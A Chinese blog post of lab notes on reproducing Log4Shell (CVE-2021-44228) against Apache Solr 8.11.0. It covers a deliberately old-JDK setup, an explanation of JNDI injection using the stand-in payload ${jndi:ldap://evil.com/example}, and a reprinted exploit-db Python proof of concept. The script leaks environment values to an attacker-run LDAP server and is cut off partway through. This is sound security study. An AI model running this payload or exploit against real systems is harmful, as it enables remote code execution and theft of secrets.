{"title":"CVE漏洞学习","uid":"0b213c75214ae7b790bcf3442a3f1836","slug":"CVE-Test","date":"2022-12-01T04:07:19.084Z","updated":"2023-09-06T12:30:20.213Z","comments":true,"path":"api/articles/CVE-Test.json","keywords":null,"cover":"/img/5.jpg","content":"<p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>\n<span id=\"more\"></span>\n\n<h1 id=\"CVE-2021-44228-Log4j2\"><a href=\"#CVE-2021-44228-Log4j2\" class=\"headerlink\" title=\"CVE-2021-44228 Log4j2\"></a>CVE-2021-44228 Log4j2</h1><h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Apache Log4j2 是一个被广泛使用的开源日志记录库，2017 年 7 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 2.0-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 2021 年 11 月 24 日向 Apache 报告了该漏洞；12 月 5 日官方发布了补丁；到了 12 月 9 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>环境搭建虚拟机版本: ubuntu 20.4<br>Apache solr版本: 8.11.0</p></blockquote>\n<h3 id=\"Apache-solr-8-11-0下载\"><a href=\"#Apache-solr-8-11-0下载\" class=\"headerlink\" title=\"Apache solr 8.11.0下载\"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</p></blockquote>\n<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>\n<p><img src=\"/post/CVE-Test/image-20221201005804892.png\" alt=\"image-20221201005804892\"></p>\n<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>\n<p>所以该版本也存在<code>CVE-2021-44228</code></p>\n<p>于是下载</p>\n<pre><code>https://archive.apache.org/dist/lucene/solr/8.11.0/\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221201010242171.png\" alt=\"image-20221201010242171\"></p>\n<h3 id=\"JAVA配置\"><a href=\"#JAVA配置\" class=\"headerlink\" title=\"JAVA配置\"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>\n<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>\n<p>但是</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>高版本的JDK环境中<code>trustURLCodebase</code>变量为false，限制了远程类的加载，导致<code>JNDI</code>注入利用失败，无法反弹shell<br>能实现利用条件：版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code>。<br>但是过低版本的，solr运行可能会出错</p></blockquote>\n<p>所以这里从官网下载专门的<code>8u171</code></p>\n<h4 id=\"解压到对应目录\"><a href=\"#解压到对应目录\" class=\"headerlink\" title=\"解压到对应目录\"></a>解压到对应目录</h4><pre><code>tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/jdk/\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221221161421513.png\" alt=\"image-20221221161421513\"></p>\n<h4 id=\"部署并修改环境变量\"><a href=\"#部署并修改环境变量\" class=\"headerlink\" title=\"部署并修改环境变量\"></a>部署并修改环境变量</h4><pre><code>sudo vi ~/.bashrc\n在文件末尾追加下面6行内容\n#set oracle jdk environment\nexport JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 ## 这里要注意目录要换成自己解压的jdk 目录\nexport JRE_HOME=$&#123;JAVA_HOME&#125;/jre  \nexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  \nexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH\n\nsource ~/.bashrc\nsudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300\n</code></pre>\n<h4 id=\"查看版本\"><a href=\"#查看版本\" class=\"headerlink\" title=\"查看版本\"></a>查看版本</h4><pre><code>java -version\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221221161638879.png\" alt=\"image-20221221161638879\"></p>\n<h3 id=\"Solr下载\"><a href=\"#Solr下载\" class=\"headerlink\" title=\"Solr下载\"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>\n<pre><code>sudo wget https://archive.apache.org/dist/lucene/solr/8.11.0/solr-8.11.0.tgz\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221201111930502.png\" alt=\"image-20221201111930502\"></p>\n<p><img src=\"/post/CVE-Test/image-20221201112302036.png\" alt=\"image-20221201112302036\"></p>\n<p>然后就解压</p>\n<pre><code>sudo tar xzf solr-8.11.0.tgz\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221201112554067-1671632324475-1.png\" alt=\"image-20221201112554067\"></p>\n<h3 id=\"安装-Apache-Solr服务\"><a href=\"#安装-Apache-Solr服务\" class=\"headerlink\" title=\"安装 Apache Solr服务\"></a>安装 <code>Apache Solr</code>服务</h3><pre><code>sudo bash solr-8.11.0/bin/install_solr_service.sh solr-8.11.0.tgz\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221201112725299.png\" alt=\"image-20221201112725299\"></p>\n<p>查看服务状态</p>\n<pre><code>sudo systemctl status solr\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221201112839632.png\" alt=\"image-20221201112839632\"></p>\n<p>发现服务已经存在</p>\n<p>启动</p>\n<pre><code>sudo /lib/systemd/systemd-sysv-install enable solr\n#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行\n</code></pre>\n<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>\n<p>查看环境搭建的虚拟机<code>ip</code></p>\n<pre><code>ip a\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221201113319037.png\" alt=\"image-20221201113319037\"></p>\n<p>得到环境搭建靶机<code>ip</code>为</p>\n<pre><code>192.168.80.131\n</code></pre>\n<h3 id=\"成功\"><a href=\"#成功\" class=\"headerlink\" title=\"成功\"></a>成功</h3><p>浏览器访问</p>\n<pre><code>http://192.168.80.131:8983\n</code></pre>\n<p><img src=\"/post/CVE-Test/image-20221220220624019.png\" alt=\"image-20221220220624019\"></p>\n<p>搭建成功</p>\n<p>内网环境中的攻击机也成功访问</p>\n<p><img src=\"/post/CVE-Test/image-20221201115827107.png\" alt=\"image-20221201115827107\"></p>\n<p>环境搭建完毕</p>\n<h2 id=\"了解漏洞描述与注入原理\"><a href=\"#了解漏洞描述与注入原理\" class=\"headerlink\" title=\"了解漏洞描述与注入原理\"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>\n<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>\n<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>\n<h3 id=\"Log4j2-Lookup\"><a href=\"#Log4j2-Lookup\" class=\"headerlink\" title=\"Log4j2 Lookup\"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>\n<p>象，用于查找不同类型的值</p>\n<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>\n<p>消息中。</p>\n<h3 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>\n<p>先了解一下<code>JNDI</code>是什么以及其组成</p>\n<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>\n<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>其中大致有<br>远程方法调用（<code>RMI</code>），通用对象请求代理体系结构（<code>CORBA</code>），轻型目录访问协议（<code>LDAP</code>）或域名服务（<code>DNS</code>）</p></blockquote>\n<p>其大致组成为</p>\n<pre class=\" language-java\"><code class=\"language-java\">String jndiName<span class=\"token operator\">=</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">;</span><span class=\"token comment\" spellcheck=\"true\">//指定需要查找name名称</span>\nContext context <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InitialContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\" spellcheck=\"true\">//初始化默认环境</span>\nDataSource ds <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>DataSourse<span class=\"token punctuation\">)</span>context<span class=\"token punctuation\">.</span><span class=\"token function\">lookup</span><span class=\"token punctuation\">(</span>jndiName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\" spellcheck=\"true\">//查找该name的数据</span>\n</code></pre>\n<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程恶意类，从而执行恶意类的命令，故而实现远程代码执行</strong></u></p>\n<h3 id=\"JNDI注入\"><a href=\"#JNDI注入\" class=\"headerlink\" title=\"JNDI注入\"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>\n<p><strong>对于<code>payload</code></strong></p>\n<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>\n<p><strong><code>JNDILookup</code>对象查找的值</strong></p>\n<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>\n<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>\n<h2 id=\"脚本分析\"><a href=\"#脚本分析\" class=\"headerlink\" title=\"脚本分析\"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>\n<p>发布时间: <code>12/12/2021</code></p>\n<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>\n<p><img src=\"/post/CVE-Test/image-20221204224323306-1671800988704-1.png\" alt=\"image-20221204224323306\"></p>\n<p>脚本内容</p>\n<pre class=\" language-python\"><code class=\"language-python\"><span class=\"token comment\" spellcheck=\"true\"># Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure</span>\n<span class=\"token comment\" spellcheck=\"true\"># Date: 12/12/2021</span>\n<span class=\"token comment\" spellcheck=\"true\"># Exploit Author: leonjza</span>\n<span class=\"token comment\" spellcheck=\"true\"># Vendor Homepage: https://logging.apache.org/log4j/2.x/</span>\n<span class=\"token comment\" spellcheck=\"true\"># Version: &lt;= 2.14.1</span>\n<span class=\"token comment\" spellcheck=\"true\"># CVE: CVE-2021-44228</span>\n\n<span class=\"token comment\" spellcheck=\"true\">#!/usr/bin/env python3</span>\n\n<span class=\"token comment\" spellcheck=\"true\"># Pure python ENV variable leak PoC for CVE-2021-44228</span>\n<span class=\"token comment\" spellcheck=\"true\"># Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284</span>\n<span class=\"token comment\" spellcheck=\"true\">#</span>\n<span class=\"token comment\" spellcheck=\"true\"># 2021 @leonjza</span>\n\n<span class=\"token keyword\">import</span> argparse\n<span class=\"token keyword\">import</span> socketserver\n<span class=\"token keyword\">import</span> threading\n<span class=\"token keyword\">import</span> time\n\n<span class=\"token keyword\">import</span> requests\n\nLDAP_HEADER <span class=\"token operator\">=</span> b<span class=\"token string\">'\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a'</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">ThreadedTCPRequestHandler</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>BaseRequestHandler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">handle</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> None<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' i| new connection from {;self.client_address[0]};'</span><span class=\"token punctuation\">)</span>\n\n        sock <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>request\n        sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\n        sock<span class=\"token punctuation\">.</span>sendall<span class=\"token punctuation\">(</span>LDAP_HEADER<span class=\"token punctuation\">)</span>\n\n        data <span class=\"token operator\">=</span> sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span>\n        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\" spellcheck=\"true\"># strip header</span>\n\n        <span class=\"token comment\" spellcheck=\"true\"># example response</span>\n        <span class=\"token comment\" spellcheck=\"true\">#</span>\n        <span class=\"token comment\" spellcheck=\"true\"># ('Java version 11.0.13\\n'</span>\n        <span class=\"token comment\" spellcheck=\"true\">#  '\\x01\\x00\\n'</span>\n        <span class=\"token comment\" spellcheck=\"true\">#  '\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b'</span>\n        <span class=\"token comment\" spellcheck=\"true\">#  'objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2')</span>\n\n        data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span>errors<span class=\"token operator\">=</span><span class=\"token string\">'ignore'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>f<span class=\"token string\">' v| extracted value: {;data};'</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">ThreadedTCPServer</span><span class=\"token punctuation\">(</span>socketserver<span class=\"token punctuation\">.</span>ThreadingMixIn<span class=\"token punctuation\">,</span> socketserver<span class=\"token punctuation\">.</span>TCPServer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span>description<span class=\"token operator\">=</span>'a simple log4j\n<span class=\"token operator\">&lt;=</span><span class=\"token number\">2.14</span> information disclosure poc '\n                                                 '<span class=\"token punctuation\">(</span>ref<span class=\"token punctuation\">:</span>\nhttps<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>twitter<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>Black2Fan<span class=\"token operator\">/</span>status<span class=\"token operator\">/</span><span class=\"token number\">1470281005038817284</span><span class=\"token punctuation\">)</span>'<span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--target'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-t'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> help<span class=\"token operator\">=</span><span class=\"token string\">'target uri'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--listen-host'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span>\n                        help<span class=\"token operator\">=</span>'exploit server host to listen on\n<span class=\"token punctuation\">(</span>default<span class=\"token punctuation\">:</span> <span class=\"token number\">127.0</span><span class=\"token punctuation\">.</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>'<span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--listen-port'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-lp'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">8888</span><span class=\"token punctuation\">,</span>\nhelp<span class=\"token operator\">=</span><span class=\"token string\">'exploit server port to listen on (default: 8888)'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--exploit-host'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-eh'</span><span class=\"token punctuation\">,</span> required<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>\ndefault<span class=\"token operator\">=</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span>\n                        help<span class=\"token operator\">=</span><span class=\"token string\">'host where (this) exploit server is reachable'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'--leak'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-l'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token string\">'${;java:version};'</span><span class=\"token punctuation\">,</span>\n                        help<span class=\"token operator\">=</span><span class=\"token 